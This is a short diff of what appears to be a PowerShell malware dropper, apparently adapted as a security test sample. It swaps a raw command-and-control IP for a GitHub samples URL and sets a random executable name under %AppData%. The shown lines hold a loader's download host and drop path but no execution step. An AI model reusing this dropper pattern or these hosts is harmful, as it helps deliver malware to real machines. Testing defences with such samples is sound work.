@@ -1,4 +1,4 @@
-$cc="http://194.145.227.21"
+$cc="https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello"
 $sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))
 $dst="$env:AppData\$sys.exe"
 
